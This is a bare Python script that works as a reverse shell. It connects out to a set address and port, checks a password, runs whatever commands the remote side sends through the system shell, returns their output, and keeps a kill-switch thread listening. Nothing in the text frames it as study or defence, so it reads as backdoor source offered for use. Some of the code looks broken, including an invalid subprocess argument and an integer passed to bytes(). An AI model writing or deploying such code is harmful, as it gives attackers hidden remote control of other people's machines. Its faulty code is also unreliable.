import subprocess, socket, os, threading
path = ''
cwd = ''
srvr = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#IP
ip = '0.0.0.0'
#PORT
port = 25565
#KILL-PORT
killport = 25565
#PASSWORD
pswd = 'password'
def listenForKillSwitch():
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	while True:
		try:
			s.connect((ip, killport))
			break
		except:
			continue
	data = s.recv(1024)
	msg = data.decode()
	while True:
		if msg == 'k_str':
			os._exit(1)
		else:
			continue
def recieve(s, buff=1024):
	data = b''
	while True:
		packet = s.recv(buff)
		data += packet
		if len(packet) < buff:
			break
	return data
def cd(newdir):
	global path, cwd
	path = os.path.normpath(f'{path}/{newdir}')
	cwd = os.path.abspath(path)
threading.Thread(target=listenForKillSwitch).start()
while True:
	try:
		path = '.'
		cwd = os.path.abspath(path)
		while True:
			try:
				srvr.connect((ip, port))
				break
			except:
				continue
		srvr.send(b'@LOGIN')
		while True:
			data = recieve(srvr)
			msg = data.decode()
			if msg == pswd:
				srvr.send(b'@CONNECTED')
				while True:
					data = recieve(srvr)
					msg = data.decode()
					if msg == '@CONFIRM-CONNECTION':
						break
					else:
						continue
				break
			else:
				srvr.send(b'@DENIED')
				continue
		while True:
			srvr.send(bytes(f'@GET-INPUT#({cwd})> ', 'utf-8'))
			data = recieve(srvr)
			msg = data.decode()
			if msg.find('@PRINT ') == 0 or msg.find('::p ') == 0:
				print(msg[7:])
				continue
			elif msg.find('cd ') == 0:
				cd(msg[3:])
				continue
			else:
				try:
					msg = subprocess.call(msg, shell=True, captureOutput=True, cwd=cwd)
				except Exception as e:
					msg = f'ERROR:    {e}'
				data = bytes(msg, 'utf-8')
				srvr.send(data)
				continue
	except ConnectionResetError:
		continue
	#except Exception as e:
	#	msg = f'@ERROR-RESET{e}'
	#	continue